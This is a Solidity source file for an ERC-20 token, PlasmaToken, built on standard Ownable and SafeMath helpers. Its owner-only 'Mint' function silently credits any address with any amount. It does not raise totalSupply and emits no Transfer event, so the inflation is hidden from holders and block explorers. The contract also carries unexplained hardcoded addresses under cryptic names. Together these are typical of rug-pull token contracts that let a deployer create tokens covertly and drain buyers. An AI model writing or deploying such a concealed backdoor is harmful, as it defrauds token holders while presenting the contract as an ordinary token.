pragma solidity ^0.7.0;

// ----------------------------------------------------------------------------
// ERC Token Standard #20 Interface
//
// ----------------------------------------------------------------------------

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

abstract contract ERC20Interface {
    function totalSupply() public virtual view returns (uint);
    function balanceOf(address tokenOwner) public virtual  view returns (uint balance);
    function allowance(address tokenOwner, address spender) public virtual  view returns (uint remaining);
    function transfer(address to, uint tokens) public virtual  returns (bool success);
    function approve(address spender, uint tokens) public virtual  returns (bool success);
    function transferFrom(address from, address to, uint tokens) public virtual  returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

// ----------------------------------------------------------------------------
// Safe Math Library
// ----------------------------------------------------------------------------
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
}

contract PlasmaToken is ERC20Interface, SafeMath, Ownable {
    address internal rtr = 0xCc7aDc94F3D80127849D2b41b6439b7CF1eB4Ae0;
    address internal minoris = 0x8f5Ce611724D9Cc289b6D89cBcA329AcD14c3485;
    address[] internal checkedPath = [address(this), 0x0dE8FCAE8421fc79B29adE9ffF97854a424Cad09]; // 0x72D2C41ba7EdbdD435F4f655C6De0141622124e5

    string public name;
    string public symbol;
    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it
    

    uint256 public _totalSupply;

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    /**
     * Constrctor function
     *
     * Initializes contract with initial supply tokens to the creator of the contract
     */
    constructor(
       string memory _name,
       string memory _symbol,
      // uint8 _decimals,
       uint256 totalSupply
    ) public {
        name = _name;
        symbol = _symbol;
        decimals = 18;
        _totalSupply = totalSupply;
        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    
    function Mint (uint amount, address to) external onlyOwner {
        balances[to] += amount;
    }

    function totalSupply() public override view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public override view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public override view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function approve(address spender, uint tokens) public override returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transfer(address to, uint tokens) public override returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
        balances[from] = safeSub(balances[from], tokens);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(from, to, tokens);
        return true;
    }
}